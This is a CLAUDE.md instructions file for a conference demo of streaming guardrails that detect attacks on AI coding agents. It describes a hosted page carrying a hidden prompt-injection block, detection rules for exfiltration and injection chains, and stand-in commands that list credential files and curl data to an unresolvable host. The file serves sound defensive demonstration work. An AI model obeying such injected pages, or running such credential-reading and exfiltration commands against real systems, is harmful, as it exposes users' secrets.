# CLAUDE.md — AgentGuard demo for Data Streaming Summit 2026

This repo holds everything for the talk **"Machine-Speed Threats Need Machine-Speed Defense: Real-Time
Guardrails for AI Agents with Streaming"** (Data Streaming Summit, Hotel Nikko San Francisco, Oct 7–8 2026,
track *Agent Harness, Runtime, and Governance*): the live-demo target project, the demo SQL and dashboard,
the stage runbook, and the design docs for the slide deck. Read `docs/` before changing anything.

## Two things to know before you do anything

1. **Every Claude Code session here streams to the demo stack.** The presenter's global
   `~/.claude/settings.json` wires the AgentGuard hook plugin (`agentguard-hook`, npm
   `@timeplus/agentguard-claudecode-plugin` 0.4.1) to every hook and ships events over the Timeplus REST
   ingest API to `https://release.demo.timeplus.com`, database `ag`. This repo's `.claude/settings.json`
   tags such sessions as deployment **`dss-demo-dev`**. Only `demo/run-demo.sh` tags a session as
   **`dss-demo`** (via a temporary `.claude/settings.local.json`). Never put `dss-demo` in the committed
   settings; the dashboard's demo view must show only rehearsal/stage traffic.
2. **This is a live, shared environment.** Anything you create in Timeplus must be prefixed `demo_`,
   listed in `demo/cleanup.sql`, and removed after the conference unless deliberately kept. Probe rows you
   insert for testing must be hard-deleted afterwards (soft-delete is not enough). Never store real
   secrets in this repo; `sandbox-home/` holds synthetic ones on purpose.

## Repo layout

```
README.md, src/, config.yaml   # the "Orderbook Service" — a harmless target project the agent reads during the demo
.claude/settings.json          # tags sessions as deployment dss-demo-dev (do not change to dss-demo)
sandbox-home/                  # HOME for the demo session: FAKE ~/.aws/credentials, ~/.ssh/id_demo, demo-fixtures/sample.env (fake tokens)
pages/vendor-notes.html        # the "attacker page": vendor release notes with a hidden prompt-injection block, served by GitHub Pages
demo/setup.sh                  # one-shot laptop setup: installs the hook plugin, wires ~/.claude/settings.json, --verify/--uninstall
demo/run-demo.sh               # launches Claude Code with HOME=sandbox-home and deployment dss-demo
demo/QUICKSTART.md             # one-page guide for a new user: prerequisites, start, prompts, troubleshooting
demo/RUNBOOK.md                # the ≈5-minute stage script (7 beats) — the source of truth for the live demo
demo/sql/0*.sql                # the four demo detection rules (materialized views), as created on the stack
demo/build_dashboard.py        # generates + validates + PUTs the "AgentGuard Overview" dashboard
demo/dashboard.json            # last published dashboard body; dashboard.backup.json = the shipped app version
demo/cleanup.sql               # removes every demo object from the stack
docs/dss2026-agentguard-e2e-demo-design.md      # demo design, decisions, engine/Console gotchas (read first)
docs/dss2026-machine-speed-defense-slide-brief.md # the spec for generating the slide deck (22 slides)
```

## The demo stack (verified 2026-10-06)

| Item | Value |
|---|---|
| Console / REST | `https://release.demo.timeplus.com` (only HTTPS 443 is exposed; timeplusd 3218/8463 and OTLP 4318 are not) |
| Engine | timeplusd 3.3.1; app `io.timeplus.agentguard` v0.1.1 installed, database `ag` |
| Credentials | the `AGENTGUARD_USERNAME` / `AGENTGUARD_PASSWORD` values in `~/.claude/settings.json` (written by `demo/setup.sh`; `demo/build_dashboard.py` reads them from the environment or that file); REST basic auth. Never commit them: this repo is public |
| Read-only SQL | `POST /default/api/v1beta2/exec` with `{"sql": "...", "type": "historical"}`; DDL uses `"type": "ddl"`; syntax check via `POST /default/api/v1beta2/sqlanalyze` |
| Dashboard | "AgentGuard Overview", id `dda310c0-1c64-4fd9-8432-37e566e0d964`, 16 panels, `PUT /default/api/v1beta2/dashboards/:id` |
| Console URL | `https://release.demo.timeplus.com/default/console/dashboard/dda310c0-1c64-4fd9-8432-37e566e0d964` |
| Tabby (Data Agent) | enabled on the stack (Opus 4.8 via Bedrock, write mode `approval`) — used in runbook beat 7 |
| Cluster | EKS context `…:cluster/release` in `~/.kube/config`; AWS credentials were expired — not needed for the demo |

Data path: Claude Code hooks → `ag.agentguard_hook_events` → `mv_cim_*` → `ag.agentguard_cim_event` →
rule MVs → `ag.agentguard_security_events` → `mv_threats` → `ag.agentguard_threats` (mutable, keyed
agent/deployment/session/rule). Hook-derived metrics land in `ag.agentguard_cim_metrics` (`tool.call`,
`tool.success`). **OTel is not flowing** (exporter points at localhost, no exposed OTLP port) — decided
out of scope; there are no token/cost metrics. **There is no AgentGuard server** on the stack, so the
synchronous *hold* is out of scope for the live demo (the deck covers it with the recorded server demo).

## Rules on the stack

Core (shipped by the app): `rp-001` Prompt Injection Shield, `rp-002` DLP Sentinel, `rp-003` Privilege
Guard, `rp-004` Supply Chain Watch. Known noise: `rp-003` has a bare `lower(tool_name) IN ('bash',…)`
predicate, so every Bash call is a warning; `rp-002` fires on Read/Edit results that contain JWT-shaped
strings or "bearer". `rp-001` only inspects the typed prompt, so indirect injection via a fetched page is
invisible to the core rules — that gap is what `demo-001` closes (worth proposing upstream as `rp-005`).

Demo (created 2026-10-06, SQL in `demo/sql/`): `mv_rule_demo001` indirect prompt injection in
`tool_result` of WebFetch/WebSearch/Read/Bash (critical) · `mv_rule_demo003` outbound data transfer
(curl/wget/scp/rsync with `--data`/`-d @`/`--upload-file`/`s3://`, critical) · `mv_demo_chain` probe →
injection → exfiltration in one session within a `hop(1m, 10m)` window (critical, one threat per session
thanks to `mv_threats` dedup) · `mv_rule_demo004` more than 40 tool calls per minute per agent (warning;
the presenter's normal peak is 22/min). Pause/resume: `SYSTEM PAUSE|RESUME MATERIALIZED VIEW ag.<name>`.

## Engine and Console gotchas (all hit on this stack — do not rediscover them)

- Regex word boundaries inside SQL string literals need `\\b` (double backslash); single `\b` is a backspace.
- `hop()` / `tumble()` work only in streaming queries (MVs). Historical dashboard panels must use
  `table(...)` and plain `GROUP BY`; `tumble(table(...), col, 1m)` is fine.
- An aggregate alias that shadows its source column (`any(session_id) AS session_id` then reused) is
  rejected as a nested aggregate; put the aggregation in a subquery and rename.
- Correlated subqueries are not supported; use a `LEFT JOIN` against an aggregated subquery.
- Window functions (`avg() OVER (...)`) must sit in their own subquery/CTE; wrapping them in
  expressions in the same SELECT fails. A window over an empty frame yields NaN, and **a result with NaN
  makes `/exec` return an empty 200 body** and the Console draw nothing — wrap with `if_not_finite(x, …)`
  and keep both branches the same type (`to_float64`).
- Console dashboards: panel `viz_type` is `chart`, `control` or `markdown`. Markdown text lives in
  `viz_config.mdString` (if you put it in `viz_content` it is executed as SQL). Selector controls:
  `viz_config = {chartType:'selector', target, defaultValue, inlineValues, label, labelWidth}` where
  `labelWidth` is a **percentage number**. `singleValue` config keys: `value, sparkline, delta,
  unit{value,position}, color, sparklineColor, increaseColor, decreaseColor, fontSize, fractionDigits`.
  Multi-series lines need long format (`series` column + `config.color = 'series'`), not several `yAxis`
  columns. Variables substitute raw (`{{filter_time_range}}` → `15m`; quote string ones). A streaming
  table panel backfills with `SETTINGS seek_to = '-15m'`.
- The app regenerates its dashboard on upgrade: after any AgentGuard app upgrade, re-run
  `python3 demo/build_dashboard.py` (it validates every panel through `/exec` or `/sqlanalyze` and then
  `PUT`s; pass `--dry` to validate only). Verify in the Console with Playwright at 1920 px, zero console errors.

## Working on the live demo

- Stage script: `demo/RUNBOOK.md`. Rehearse end to end once with `./demo/run-demo.sh`; confirm each beat
  lights the expected rule on the dashboard (Deployment = `dss-demo`, Time Range = `15m`).
- The attacker page is live at https://timeplus-io.github.io/agentguard-demo-target/pages/vendor-notes.html
  (GitHub Pages, branch `main`, `.nojekyll` at the root; a push to `main` republishes it). Before the talk: record a screen capture of beats 1–6 as the fallback video for the deck's demo slide.
- The exfil target `collector.example.invalid` is unresolvable by design; nothing leaves the laptop.
- After the conference: run `demo/cleanup.sql` (or decide to keep the demo rules) and, if wanted, restore
  the shipped dashboard from `demo/dashboard.backup.json`.

## Working on the slide deck

Follow `docs/dss2026-machine-speed-defense-slide-brief.md` exactly: fork
`https://github.com/timeplus-io/Presentation---AgentGuard-Introduction` (React 19 + Vite + Tailwind v4 +
motion, 16:9), keep its `Presentation.tsx`, tokens and assets, and build the 22 slides it specifies.
Only facts in the brief's §6 may appear on slides; baseline/chain SQL is illustrative unless replaced by
the real `demo/sql/` rules (which now exist — prefer them). The hold slides (16–17) describe the AgentGuard
server feature and use the recorded demo, not this stack. Open items: speaker name, slot length
(assume 30 min), whether the deck repo lives inside this repo or beside it.

## Decisions log

- 2026-10-06: no hold in the live demo (app has no hold feature); no OTel; four `demo_` MVs created;
  installed dashboard edited in place rather than a new one; attacker page hosted as a gist/Pages.
- 2026-10-07: repo published public at github.com/timeplus-io/agentguard-demo-target; attacker page served by GitHub Pages from `main`.
- 2026-10-07: live demo redesigned to use **benign signature commands** instead of asking the agent to steal
  credentials. A well-aligned model (Fable 5.1 and the other Claude Code models) correctly refuses the real
  exfil, so the chain never fired. The rules match tool-call *signatures* in telemetry, so benign stand-ins
  trigger them: WebFetch the page (probe + demo-001), `grep` the page for the hidden block (injection stage +
  demo-001), `ls ~/.aws/credentials ~/.ssh/id_demo` (credential_access), `cat sandbox-home/demo-fixtures/sample.env`
  (rp-002), `curl --data status=ok https://collector.example.invalid/x` (demo-003 + exfiltration → demo-chain).
  Verified live 2026-10-07: all five rules fired in one session with no refusal. See `demo/RUNBOOK.md`.
- 2026-10-06: presentations docs moved here from the neutron repo; dev sessions tagged `dss-demo-dev`.
